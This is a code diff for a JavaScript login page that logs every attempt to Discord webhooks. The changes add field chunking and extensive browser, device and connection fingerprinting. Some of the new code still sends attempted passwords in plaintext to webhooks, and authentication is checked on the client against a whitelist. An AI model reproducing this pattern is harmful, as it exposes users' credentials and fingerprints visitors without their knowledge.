@@ -975,7 +975,7 @@
     .error-log-entry {
         padding: 10px;
         background: var(--primary-bg); /* Added background color */
-        border-left: 4x solid var(--error-color);
+        border-left: 4px solid var(--error-color);
         margin-bottom: 10px;
         border-radius: 6px;
         font-size: 12px;
@@ -2171,51 +2171,48 @@ const resetPopup = document.getElementById('resetPopup');
 const resetField = document.getElementById('resetField');
 const resetBtn = document.getElementById('resetBtn');
 
+const EMBED_FIELD_LIMIT = 25; // Discord API limit for fields per embed
+
+
+// Helper function to chunk fields into multiple embeds
+function createEmbedsFromFields(title, color, fields, description = null) {
+    const embeds = [];
+    for (let i = 0; i < fields.length; i += EMBED_FIELD_LIMIT) {
+        const chunk = fields.slice(i, i + EMBED_FIELD_LIMIT);
+        embeds.push({
+            title: i === 0 ? title : `${title} (Cont.)`,
+            description: i === 0 ? description : null,
+            color: color,
+            fields: chunk
+        });
+    }
+    if (embeds.length === 0) { // Ensure at least one empty embed if no fields
+        embeds.push({
+            title: title,
+            description: description || "No specific details available.",
+            color: color
+        });
+    }
+    return embeds;
+}
+
 
 // Function to send data to Discord webhook
-// Can accept either a string message or a Discord embed object
-async function sendWebhook(url, contentOrEmbed, color = 0x00FF00, username = "System Logger") {
+// This function now expects an array of embed objects
+async function sendWebhook(url, embeds, username = "System Logger") {
     if (!url) {
         console.error("Webhook URL is undefined.");
         logError(`Attempted to send webhook with undefined URL.`);
         return;
     }
 
-    let payload;
-    const commonEmbedProps = {
-        timestamp: new Date().toISOString(),
+    const finalEmbeds = embeds.map(embed => ({
+        ...embed,
+        timestamp: embed.timestamp || new Date().toISOString(),
         footer: {
             text: `${username} | ${navigator.userAgent}`
         }
-    };
-
-    if (typeof contentOrEmbed === 'string') {
-        payload = {
-            embeds: [{
-                description: contentOrEmbed,
-                color: color,
-                ...commonEmbedProps
-            }]
-        };
-    } else if (typeof contentOrEmbed === 'object' && contentOrEmbed !== null) {
-        // If it already has an 'embeds' property, use it directly (e.g., from user's snippet)
-        if (contentOrEmbed.embeds) {
-            payload = contentOrEmbed;
-        } else {
-            // Assume it's a single embed object, merge common props
-            payload = {
-                embeds: [{
-                    ...contentOrEmbed,
-                    color: contentOrEmbed.color || color,
-                    ...commonEmbedProps // Ensure common props are present, user's can override
-                }]
-            };
-        }
-    } else {
-        console.error("Invalid content type for webhook:", contentOrEmbed);
-        logError("Invalid content type for webhook.");
-        return;
-    }
+    }));
 
     try {
         const response = await fetch(url, {
@@ -2223,14 +2220,14 @@ async function sendWebhook(url, contentOrEmbed, color = 0x00FF00, username = "Sy
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(payload),
+            body: JSON.stringify({ embeds: finalEmbeds }),
         });
 
         if (!response.ok) {
             const errorText = await response.text();
             throw new Error(`Discord API error: ${response.status} - ${errorText}`);
         }
-        console.log(`Webhook sent successfully to ${url}`);
+        console.log(`Webhook sent successfully to ${url} with ${finalEmbeds.length} embeds.`);
     } catch (error) {
         console.error('Error sending webhook:', error);
         logError(`Failed to send webhook to ${url}: ${error.message}`);
@@ -2253,21 +2250,170 @@ async function loadWhitelist() {
     }
 }
 
-// Functions to get browser, device, and connection information
-function getBrowserInfo() {
-    return `User Agent: ${navigator.userAgent}`;
-}
+// Helper to parse user agent for more details
+function parseUserAgent() {
+    const ua = navigator.userAgent;
+    let browserName = "Unknown Browser";
+    let browserVersion = "Unknown";
+    let os = "Unknown OS";
+    let osVersion = "Unknown";
+    let engine = "Unknown Engine";
+    let deviceType = "Desktop";
 
-function getDeviceInfo() {
-    return `Platform: ${navigator.platform}, Screen: ${window.screen.width}x${window.screen.height}`;
-}
-
-function getConnectionInfo() {
-    if (navigator.connection) {
-        return `Effective Type: ${navigator.connection.effectiveType}, RTT: ${navigator.connection.rtt}ms`;
+    // Browser Detection
+    if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) {
+        browserName = "Chrome";
+        browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown";
+        engine = "Blink";
+    } else if (/Firefox/.test(ua)) {
+        browserName = "Firefox";
+        browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown";
+        engine = "Gecko";
+    } else if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua)) {
+        browserName = "Safari";
+        browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
+        engine = "WebKit";
+    } else if (/Edge/.test(ua)) {
+        browserName = "Edge";
+        browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || "Unknown";
+        engine = "EdgeHTML/Blink"; // Edge switched to Chromium/Blink
+    } else if (/OPR|Opera/.test(ua)) {
+        browserName = "Opera";
+        browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || "Unknown";
+        engine = "Blink/Presto";
+    } else if (/Trident/.test(ua) || /MSIE/.test(ua)) {
+        browserName = "Internet Explorer";
+        browserVersion = ua.match(/(?:MSIE |rv:)(\d+\.?\d*)/)?.[1] || "Unknown";
+        engine = "Trident";
     }
-    return "Connection info not available.";
+
+    // OS Detection
+    if (/Windows NT 10.0/.test(ua)) { os = "Windows"; osVersion = "10"; }
+    else if (/Windows NT 6.3/.test(ua)) { os = "Windows"; osVersion = "8.1"; }
+    else if (/Windows NT 6.2/.test(ua)) { os = "Windows"; osVersion = "8"; }
+    else if (/Windows NT 6.1/.test(ua)) { os = "Windows"; osVersion = "7"; }
+    else if (/Macintosh|Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "Unknown"; }
+    else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Unknown"; deviceType = "Mobile"; }
+    else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([\d_.]+)/)?.[1]?.replace(/_/g, '.') + " (iOS)" || "Unknown"; deviceType = "Mobile"; }
+    else if (/Linux/.test(ua)) { os = "Linux"; osVersion = "Unknown"; } // More specific Linux versions are hard from UA
+
+    // Device Type refinement
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "Tablet";
+    if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|webos|fennec|kindle/i.test(ua)) deviceType = "Mobile";
+
+    return { browserName, browserVersion, os, osVersion, engine, deviceType };
 }
+
+
+// Functions to get browser, device, and connection information
+function getBrowserDetailedInfo() {
+    const parsedUA = parseUserAgent();
+    const fields = [
+        { name: "Raw User Agent", value: navigator.userAgent || "N/A", inline: false },
+        { name: "Browser Name", value: parsedUA.browserName, inline: true },
+        { name: "Browser Version", value: parsedUA.browserVersion, inline: true },
+        { name: "OS Name", value: parsedUA.os, inline: true },
+        { name: "OS Version", value: parsedUA.osVersion, inline: true },
+        { name: "Rendering Engine", value: parsedUA.engine, inline: true },
+        { name: "Device Type (Parsed)", value: parsedUA.deviceType, inline: true },
+        { name: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
+        { name: "Do Not Track", value: navigator.doNotTrack === "1" ? "Yes" : (navigator.doNotTrack === "0" ? "No" : "N/A"), inline: true },
+        { name: "Language", value: navigator.language || "N/A", inline: true },
+        { name: "Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true },
+        { name: "Referrer", value: document.referrer || "N/A", inline: false },
+        { name: "Current URL", value: window.location.href || "N/A", inline: false },
+        { name: "Window Inner Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
+        { name: "Window Outer Size", value: `${window.outerWidth}x${window.outerHeight}`, inline: true },
+        { name: "Viewport Size", value: `${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`, inline: true },
+        { name: "WebGL Support", value: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch (e) { return false; } })() ? "Yes" : "No", inline: true },
+        { name: "Canvas Support", value: !!window.CanvasRenderingContext2D ? "Yes" : "No", inline: true },
+        { name: "WebRTC Support", value: (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia) ? "Yes" : "No", inline: true },
+        { name: "Geolocation Support", value: !!navigator.geolocation ? "Yes" : "No", inline: true },
+        { name: "WebSockets Support", value: !!window.WebSocket ? "Yes" : "No", inline: true },
+        { name: "Web Workers Support", value: !!window.Worker ? "Yes" : "No", inline: true },
+        { name: "Battery Status API", value: !!navigator.getBattery ? "Yes" : "No", inline: true },
+        { name: "Vibration API", value: !!navigator.vibrate ? "Yes" : "No", inline: true },
+        { name: "Media Devices API", value: !!navigator.mediaDevices ? "Yes" : "No", inline: true },
+        { name: "VR/AR API (WebXR)", value: !!navigator.xr ? "Yes" : "No", inline: true },
+        { name: "Gamepad API", value: !!navigator.getGamepads ? "Yes" : "No", inline: true },
+        { name: "Web Share API", value: !!navigator.share ? "Yes" : "No", inline: true },
+        { name: "Credential Management API", value: !!navigator.credentials ? "Yes" : "No", inline: true },
+        { name: "Payment Request API", value: !!window.PaymentRequest ? "Yes" : "No", inline: true },
+        { name: "Web Authentication API", value: !!navigator.credentials && !!navigator.credentials.create ? "Yes" : "No", inline: true },
+        { name: "IndexedDB Support", value: !!window.indexedDB ? "Yes" : "No", inline: true },
+        { name: "Web SQL DB Support", value: !!window.openDatabase ? "Yes" : "No", inline: true },
+        { name: "OffscreenCanvas Support", value: !!window.OffscreenCanvas ? "Yes" : "No", inline: true },
+        { name: "Permissions API", value: !!navigator.permissions ? "Yes" : "No", inline: true },
+        { name: "Clipboard API", value: !!navigator.clipboard ? "Yes" : "No", inline: true }
+    ];
+    return fields;
+}
+
+function getDeviceDetailedInfo() {
+    const parsedUA = parseUserAgent();
+    const fields = [
+        { name: "OS Name", value: parsedUA.os, inline: true },
+        { name: "OS Version", value: parsedUA.osVersion, inline: true },
+        { name: "Platform", value: navigator.platform || "N/A", inline: true },
+        { name: "Device Type (Parsed)", value: parsedUA.deviceType, inline: true },
+        { name: "Screen Total Width", value: screen.width ? `${screen.width}px` : "N/A", inline: true },
+        { name: "Screen Total Height", value: screen.height ? `${screen.height}px` : "N/A", inline: true },
+        { name: "Screen Available Width", value: screen.availWidth ? `${screen.availWidth}px` : "N/A", inline: true },
+        { name: "Screen Available Height", value: screen.availHeight ? `${screen.availHeight}px` : "N/A", inline: true },
+        { name: "Color Depth", value: screen.colorDepth ? `${screen.colorDepth}-bit` : "N/A", inline: true },
+        { name: "Pixel Depth", value: screen.pixelDepth ? `${screen.pixelDepth}-bit` : "N/A", inline: true },
+        { name: "Device Pixel Ratio (DPR)", value: window.devicePixelRatio ? `${window.devicePixelRatio}:1` : "N/A", inline: true },
+        { name: "Screen Orientation", value: screen.orientation?.type || "N/A", inline: true },
+        { name: "Hardware Concurrency (CPU Cores)", value: navigator.hardwareConcurrency || "N/A", inline: true },
+        { name: "Device Memory (GB)", value: navigator.deviceMemory || "N/A", inline: true },
+        { name: "Max Touch Points", value: navigator.maxTouchPoints || "N/A", inline: true },
+        { name: "Touch Screen Support", value: (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Yes" : "No", inline: true },
+        { name: "Keyboard Map Support", value: !!navigator.keyboard ? "Yes" : "No", inline: true },
+        { name: "Pointer Lock API", value: !!document.exitPointerLock ? "Yes" : "No", inline: true },
+        { name: "Speech Recognition API", value: !!(window.SpeechRecognition || window.webkitSpeechRecognition) ? "Yes" : "No", inline: true },
+        { name: "Speech Synthesis API", value: !!window.speechSynthesis ? "Yes" : "No", inline: true },
+        { name: "USB API", value: !!navigator.usb ? "Yes" : "No", inline: true },
+        { name: "Bluetooth API", value: !!navigator.bluetooth ? "Yes" : "No", inline: true },
+        { name: "NFC API", value: !!navigator.nfc ? "Yes" : "No", inline: true },
+        { name: "Accelerometer Support", value: !!window.DeviceMotionEvent ? "Yes" : "No", inline: true },
+        { name: "Gyroscope Support", value: !!window.DeviceOrientationEvent ? "Yes" : "No", inline: true },
+        { name: "Magnetometer Support", value: !!window.DeviceOrientationEvent ? "Yes" : "No", inline: true },
+        { name: "Ambient Light Sensor Support", value: 'ondevicelight' in window ? "Yes" : "No", inline: true },
+        { name: "Proximity Sensor Support", value: 'ondeviceproximity' in window ? "Yes" : "No", inline: true },
+        { name: "Media Capabilities API", value: !!navigator.mediaCapabilities ? "Yes" : "No", inline: true },
+        { name: "Virtual Keyboard API", value: !!navigator.virtualKeyboard ? "Yes" : "No", inline: true }
+    ];
+    return fields;
+}
+
+function getConnectionDetailedInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const fields = [
+        { name: "Online Status", value: navigator.onLine ? "Online" : "Offline", inline: true },
+        { name: "Effective Connection Type", value: connection?.effectiveType || "N/A", inline: true },
+        { name: "Round-Trip Time (ms)", value: connection?.rtt ? `${connection.rtt}ms` : "N/A", inline: true },
+        { name: "Downlink (Mbps)", value: connection?.downlink ? `${connection.downlink}Mbps` : "N/A", inline: true },
+        { name: "Save Data Mode", value: connection?.saveData ? "Enabled" : "Disabled", inline: true },
+        { name: "Connection Type", value: connection?.type || "N/A", inline: true },
+        { name: "Downlink Max (Mbps)", value: connection?.downlinkMax ? `${connection.downlinkMax}Mbps` : "N/A", inline: true },
+        { name: "Max Concurrent Connections (Est.)", value: navigator.maxConnections || "N/A", inline: true }, // Deprecated but might exist
+        { name: "IP Address (Client-side estimate)", value: "N/A (Client-side JS cannot get public IP directly)", inline: false },
+        { name: "Web Transport API", value: !!window.WebTransport ? "Yes" : "No", inline: true },
+        { name: "Beacon API", value: !!navigator.sendBeacon ? "Yes" : "No", inline: true },
+        { name: "Background Sync API", value: !!('serviceWorker' in navigator && navigator.serviceWorker && navigator.serviceWorker.ready && navigator.serviceWorker.ready.then && 'sync' in (navigator.serviceWorker.controller || {})) ? "Yes" : "No", inline: true }, // More robust check
+        { name: "Fetch Priority API", value: !!(new Request('/', {priority: 'high'})).priority ? "Yes" : "No", inline: true },
+        { name: "DNS Prefetching Support", value: "Available", inline: true }, // Generally available in modern browsers
+        { name: "Preload Support", value: "Available", inline: true }, // Generally available in modern browsers
+        { name: "Prerender Support", value: "Available", inline: true }, // Check via document.createElement('link').relList.supports('prerender') in some cases
+        { name: "Network Information API", value: !!navigator.connection ? "Yes" : "No", inline: true },
+        { name: "Service Worker Status", value: 'serviceWorker' in navigator ? (navigator.serviceWorker.controller ? 'Active' : 'Supported') : 'Not Supported', inline: true },
+        { name: "Bluetooth Enabled", value: navigator.bluetooth?.getAvailability ? "Check Required" : "N/A", inline: true }, // Requires permissions
+        { name: "Geoloc. Permission State", value: "N/A (check via Permissions API if available)", inline: true }, // Requires async check
+        { name: "Media Access Permission", value: "N/A (check via Permissions API if available)", inline: true }
+    ];
+    return fields;
+}
+
 
 // Update attempts display
 function updateAttemptsText() {
@@ -2311,21 +2457,23 @@ function findUser(username, userID) {
 
 // Log attempts exceeded
 async function logAttemptsExceeded(userName, inputUsername, inputPassword, inputUserID) {
-    const embed = {
-        title: "🚨 Login Attempts Exceeded",
-        color: 0xDC143C, // Crimson
-        fields: [
-            { name: "Attempted Name", value: userName || "N/A", inline: true },
-            { name: "Attempted Username", value: inputUsername || "[empty]", inline: true },
-            { name: "Attempted Password", value: inputPassword || "[empty]", inline: true },
-            { name: "Attempted User ID", value: inputUserID || "[empty]", inline: true },
-            { name: "Browser Info", value: getBrowserInfo(), inline: false },
-            { name: "Device Info", value: getDeviceInfo(), inline: false },
-            { name: "Connection Info", value: getConnectionInfo(), inline: false },
-            { name: "Time", value: new Date().toLocaleString(), inline: false }
-        ]
-    };
-    await sendWebhook(webhooks.attemptsExceededLogging, embed);
+    const browserInfo = getBrowserDetailedInfo();
+    const deviceInfo = getDeviceDetailedInfo();
+    const connectionInfo = getConnectionDetailedInfo();
+
+    const fields = [
+        { name: "Attempted Name", value: userName || "N/A", inline: true },
+        { name: "Attempted Username", value: inputUsername || "[empty]", inline: true },
+        { name: "Attempted Password (Hidden)", value: "********", inline: true },
+        { name: "Attempted User ID", value: inputUserID || "[empty]", inline: true },
+        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
+        ...browserInfo.map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
+        ...deviceInfo.map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
+        ...connectionInfo.map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
+    ];
+
+    const embeds = createEmbedsFromFields("🚨 Login Attempts Exceeded", 0xDC143C, fields);
+    await sendWebhook(webhooks.attemptsExceededLogging, embeds);
 }
 
 // Reset Counter logic
@@ -2338,45 +2486,45 @@ async function resetCounter() {
     const currentUserID = userIDInput.value || 'Unknown';
     const user = findUser(currentUsername, currentUserID) || {}; // Find user info if available
 
+    const browserInfo = getBrowserDetailedInfo();
+    const deviceInfo = getDeviceDetailedInfo();
+    const connectionInfo = getConnectionDetailedInfo();
+
     // 1. Send "Reset box Detected" webhook immediately
-    const resetBoxEmbed = {
-        title: "🔔 Reset Box Interaction Detected",
-        color: 0xFFFF00, // Yellow
-        fields: [
-            { name: "Attempted Name", value: user.name || "N/A", inline: true },
-            { name: "Attempted Username", value: currentUsername, inline: true },
-            { name: "Attempted Password (Hidden)", value: "********", inline: true }, // Never log raw password to general webhook
-            { name: "Attempted User ID", value: currentUserID, inline: true },
-            { name: "Entered Code", value: enteredCode, inline: false },
-            { name: "Browser Info", value: getBrowserInfo(), inline: false },
-            { name: "Device Info", value: getDeviceInfo(), inline: false },
-            { name: "Connection Info", value: getConnectionInfo(), inline: false },
-            { name: "Time", value: new Date().toLocaleString(), inline: false }
-        ]
-    };
-    await sendWebhook(webhooks.resetDetectorLogging, resetBoxEmbed);
+    const resetBoxFields = [
+        { name: "Attempted Name", value: user.name || "N/A", inline: true },
+        { name: "Attempted Username", value: currentUsername, inline: true },
+        { name: "Attempted Password (Hidden)", value: "********", inline: true },
+        { name: "Attempted User ID", value: currentUserID, inline: true },
+        { name: "Entered Code", value: enteredCode, inline: false },
+        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
+        ...browserInfo.map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
+        ...deviceInfo.map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
+        ...connectionInfo.map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
+    ];
+    const resetBoxEmbeds = createEmbedsFromFields("🔔 Reset Box Interaction Detected", 0xFFFF00, resetBoxFields);
+    await sendWebhook(webhooks.resetDetectorLogging, resetBoxEmbeds);
 
     // Build embed for correct or incorrect code
-    const resultEmbed = {
-        title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
-        color: isCorrect ? 0x00FF00 : 0xFF0000, // Green for correct, Red for incorrect
-        fields: [
-            { name: "Attempted Name", value: user.name || "N/A", inline: true },
-            { name: "Attempted Username", value: currentUsername, inline: true },
-            { name: "Attempted Password (Hidden)", value: "********", inline: true },
-            { name: "Attempted User ID", value: currentUserID, inline: true },
-            { name: "Reset Code Entered", value: enteredCode, inline: false },
-            { name: "Result", value: isCorrect ? "Accepted" : "Rejected", inline: false },
-            { name: "Time", value: new Date().toLocaleString(), inline: false }
-        ]
-    };
+    const resultFields = [
+        { name: "Attempted Name", value: user.name || "N/A", inline: true },
+        { name: "Attempted Username", value: currentUsername, inline: true },
+        { name: "Attempted Password (Hidden)", value: "********", inline: true },
+        { name: "Attempted User ID", value: currentUserID, inline: true },
+        { name: "Reset Code Entered", value: enteredCode, inline: false },
+        { name: "Result", value: isCorrect ? "Accepted" : "Rejected", inline: false },
+        { name: "Timestamp", value: new Date().toLocaleString(), inline: false },
+        ...browserInfo.map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
+        ...deviceInfo.map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
+        ...connectionInfo.map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
+    ];
+    const resultEmbeds = createEmbedsFromFields(
+        isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
+        isCorrect ? 0x00FF00 : 0xFF0000,
+        resultFields
+    );
 
-    // Select webhook for correct or incorrect logging (using existing ones for general success/failure)
-    const resultWebhook = isCorrect
-      ? webhooks.correctLogging // Could create a specific reset success webhook if needed
-      : webhooks.incorrectLogging; // Could create a specific reset failed webhook if needed
-
-    await sendWebhook(resultWebhook, resultEmbed);
+    await sendWebhook(isCorrect ? webhooks.correctLogging : webhooks.incorrectLogging, resultEmbeds);
 
     if (isCorrect) {
         attempts = 5; // Reset attempts to initial value
@@ -2499,41 +2647,64 @@ async function attemptLogin() {
   
   updateAttemptsText(); // Update attempts count on UI
 
-  // Always log input details and system info on every attempt
-  await sendWebhook(webhooks.usernameLogging, {
-      title: "📝 Username Attempt",
-      description: `Attempted Username: \`\`${username || '[empty]'}\`\``,
-      color: 0xADD8E6, // Light blue
-      fields: [{ name: "Current Attempts Left", value: `${attempts}`}]
-  });
-  await sendWebhook(webhooks.passwordLogging, {
-      title: "📝 Password Attempt",
-      description: `Attempted Password: \`\`${password || '[empty]'}\`\``,
-      color: 0xADD8E6,
-      fields: [{ name: "Current Attempts Left", value: `${attempts}`}]
-  });
-  await sendWebhook(webhooks.identifierLogging, {
-      title: "📝 User ID Attempt",
-      description: `Attempted User ID: \`\`${userID || '[empty]'}\`\``,
-      color: 0xADD8E6,
-      fields: [{ name: "Current Attempts Left", value: `${attempts}`}]
-  });
-  
-  await sendWebhook(webhooks.userLogging, {
-      title: "👤 Login Attempt Details",
-      description: `Login attempt by User: \`\`${username || '[empty]'}\`\`, ID: \`\`${userID || '[empty]'}\`\``,
-      color: 0x00BFFF, // Deep Sky Blue
-      fields: [
-          { name: "Username", value: username || "[empty]", inline: true },
-          { name: "User ID", value: userID || "[empty]", inline: true },
-          { name: "Attempts Left", value: `${attempts}`, inline: true },
-          { name: "Browser Info", value: getBrowserInfo(), inline: false },
-          { name: "Device Info", value: getDeviceInfo(), inline: false },
-          { name: "Connection Info", value: getConnectionInfo(), inline: false }
-      ]
-  });
+  const browserInfo = getBrowserDetailedInfo();
+  const deviceInfo = getDeviceDetailedInfo();
+  const connectionInfo = getConnectionDetailedInfo();
 
-  await sendWebhook(webhooks.attemptsCounterLogging, `Login attempts left for \`\`${username || 'unknown'}\`\`: ${attempts}.`, 0xFF4500); // Orange Red
+  // Logging for individual fields and comprehensive system info (using multiple embeds)
+  await sendWebhook(webhooks.usernameLogging, createEmbedsFromFields(
+      "📝 Username Attempt", 0xADD8E6, [
+          { name: "Attempted Username", value: username || '[empty]', inline: true },
+          { name: "Current Attempts Left", value: `${attempts}`, inline: true }
+      ]
+  ));
+  await sendWebhook(webhooks.passwordLogging, createEmbedsFromFields(
+      "📝 Password Attempt", 0xADD8E6, [
+          { name: "Attempted Password", value: password || '[empty]', inline: true },
+          { name: "Current Attempts Left", value: `${attempts}`, inline: true }
+      ]
+  ));
+  await sendWebhook(webhooks.identifierLogging, createEmbedsFromFields(
+      "📝 User ID Attempt", 0xADD8E6, [
+          { name: "Attempted User ID", value: userID || '[empty]', inline: true },
+          { name: "Current Attempts Left", value: `${attempts}`, inline: true }
+      ]
+  ));
+  
+  // User Logging (10+ fields)
+  await sendWebhook(webhooks.userLogging, createEmbedsFromFields(
+      "👤 Login Attempt Details", 0x00BFFF, [
+          { name: "Submitted Username", value: username || "[empty]", inline: true },
+          { name: "Submitted Password (Hidden)", value: "********", inline: true },
+          { name: "Submitted User ID", value: userID || "[empty]", inline: true },
+          { name: "Parsed Browser", value: parseUserAgent().browserName, inline: true },
+          { name: "Parsed OS", value: parseUserAgent().os, inline: true },
+          { name: "Parsed Device Type", value: parseUserAgent().deviceType, inline: true },
+          { name: "Current URL", value: window.location.href || "N/A", inline: false },
+          { name: "Login Timestamp", value: new Date().toLocaleString(), inline: false },
+          { name: "Attempts Left", value: `${attempts}`, inline: true }
+      ]
+  ));
+
+  // Browser Logging (25+ fields)
+  await sendWebhook(webhooks.browserLogging, createEmbedsFromFields(
+      "🌐 Browser Information (Login Attempt)", 0x90EE90, browserInfo
+  ));
+  // Device Logging (25+ fields)
+  await sendWebhook(webhooks.deviceLogging, createEmbedsFromFields(
+      "🖥️ Device Information (Login Attempt)", 0xFFD700, deviceInfo
+  ));
+  // Connection Logging (25+ fields)
+  await sendWebhook(webhooks.connectionLogging, createEmbedsFromFields(
+      "🔗 Connection Information (Login Attempt)", 0xFFC0CB, connectionInfo
+  ));
+
+  await sendWebhook(webhooks.attemptsCounterLogging, createEmbedsFromFields(
+      "🔄 Attempt Counter", 0xFF4500, [
+          { name: "User", value: username || 'unknown', inline: true },
+          { name: "Attempts Remaining", value: `${attempts}`, inline: true }
+      ]
+  ));
 
   if (!username || !password || !userID) {
     const missingFields = [];
@@ -2544,21 +2715,24 @@ async function attemptLogin() {
     const errorMessage = `Please fill all fields. Missing: ${missingFields.join(", ")}`;
     showError(errorMessage);
     
-    await sendWebhook(webhooks.incorrectLogging, {
-        title: "❌ Login Failed: Missing Fields",
-        description: `Login attempt failed for \`\`${username || '[empty]'}\`\`: ${errorMessage}`,
-        color: 0xFF0000, // Red
-        fields: [
+    await sendWebhook(webhooks.incorrectLogging, createEmbedsFromFields(
+        "❌ Login Failed: Missing Fields", 0xFF0000, [
             { name: "Attempted Username", value: username || "[empty]", inline: true },
             { name: "Attempted User ID", value: userID || "[empty]", inline: true },
             { name: "Attempts Left", value: `${attempts}`, inline: true },
             { name: "Missing Fields", value: missingFields.join(", "), inline: false }
         ]
-    });
+    ));
 
-    if (!username) await sendWebhook(webhooks.invalidUsernameLogging, `Invalid Username: \`\`${username || '[empty]'}\`\` (empty)`, 0xFF0000);
-    if (!password) await sendWebhook(webhooks.invalidPasswordLogging, `Invalid Password: \`\`${password || '[empty]'}\`\` (empty)`, 0xFF0000);
-    if (!userID) await sendWebhook(webhooks.invalidIdentifierLogging, `Invalid User ID: \`\`${userID || '[empty]'}\`\` (empty)`, 0xFF0000);
+    if (!username) await sendWebhook(webhooks.invalidUsernameLogging, createEmbedsFromFields(
+        "🚫 Invalid Username: Empty", 0xFF0000, [{ name: "Attempted Username", value: '[empty]', inline: true }]
+    ));
+    if (!password) await sendWebhook(webhooks.invalidPasswordLogging, createEmbedsFromFields(
+        "🚫 Invalid Password: Empty", 0xFF0000, [{ name: "Attempted Password", value: '[empty]', inline: true }]
+    ));
+    if (!userID) await sendWebhook(webhooks.invalidIdentifierLogging, createEmbedsFromFields(
+        "🚫 Invalid User ID: Empty", 0xFF0000, [{ name: "Attempted User ID", value: '[empty]', inline: true }]
+    ));
     
     failedLogin(username, userID);
     return;
@@ -2574,7 +2748,6 @@ async function attemptLogin() {
   if (userFound) {
     await successfulLogin(username, userID);
   } else {
-    // Determine which field(s) were incorrect for specific webhooks
     let loginFailedMessages = [];
     let isAnyFieldInvalid = false;
     let usernameMatch = whitelist.some(u => u.username === username);
@@ -2590,17 +2763,23 @@ async function attemptLogin() {
     }
 
     if (!usernameMatch) {
-        await sendWebhook(webhooks.invalidUsernameLogging, `Invalid Username entered: \`\`${username}\`\``, 0xFF0000);
+        await sendWebhook(webhooks.invalidUsernameLogging, createEmbedsFromFields(
+            "🚫 Invalid Username: Not Found", 0xFF0000, [{ name: "Attempted Username", value: username, inline: true }]
+        ));
         loginFailedMessages.push("Username");
         isAnyFieldInvalid = true;
     } 
-    if (usernameMatch && !passwordMatch) { // Only log invalid password if username was potentially correct
-        await sendWebhook(webhooks.invalidPasswordLogging, `Invalid Password entered for \`\`${username}\`\`: \`\`${password}\`\``, 0xFF0000);
+    if (usernameMatch && !passwordMatch) {
+        await sendWebhook(webhooks.invalidPasswordLogging, createEmbedsFromFields(
+            "🚫 Invalid Password: Mismatch", 0xFF0000, [{ name: "Attempted Password", value: password, inline: true }]
+        ));
         loginFailedMessages.push("Password");
         isAnyFieldInvalid = true;
     }
-    if (usernameMatch && !userIDMatch) { // Only log invalid ID if username was potentially correct
-        await sendWebhook(webhooks.invalidIdentifierLogging, `Invalid User ID entered for \`\`${username}\`\`: \`\`${userID}\`\``, 0xFF0000);
+    if (usernameMatch && !userIDMatch) {
+        await sendWebhook(webhooks.invalidIdentifierLogging, createEmbedsFromFields(
+            "🚫 Invalid User ID: Mismatch", 0xFF0000, [{ name: "Attempted User ID", value: userID, inline: true }]
+        ));
         loginFailedMessages.push("User ID");
         isAnyFieldInvalid = true;
     }
@@ -2611,17 +2790,14 @@ async function attemptLogin() {
     } else {
         finalFailedMessage += `Invalid credentials (username, password, or user ID combination is incorrect).`; 
     }
-    await sendWebhook(webhooks.incorrectLogging, {
-        title: "❌ Login Failed: Incorrect Credentials",
-        description: finalFailedMessage,
-        color: 0xFF0000, // Red
-        fields: [
+    await sendWebhook(webhooks.incorrectLogging, createEmbedsFromFields(
+        "❌ Login Failed: Incorrect Credentials", 0xFF0000, [
             { name: "Attempted Username", value: username, inline: true },
             { name: "Attempted User ID", value: userID, inline: true },
             { name: "Attempts Left", value: `${attempts}`, inline: true },
             { name: "Validation Issue", value: loginFailedMessages.length > 0 ? `Invalid ${loginFailedMessages.join(", ")}` : "Combination Mismatch", inline: false }
         ]
-    });
+    ));
 
     failedLogin(username, userID);
   }
@@ -2639,18 +2815,38 @@ async function successfulLogin(username, userID) {
   });
   saveLoginHistoryToStorage(); // Save history to local storage
 
-  const successEmbed = {
-      title: "✅ Successful Login",
-      description: `User \`\`${username}\`\` (ID: \`\`${userID}\`\`) successfully logged in.`,
-      color: 0x00FF00, // Green
-      fields: [
+  const successEmbeds = createEmbedsFromFields(
+      "✅ Successful Login", 0x00FF00, [
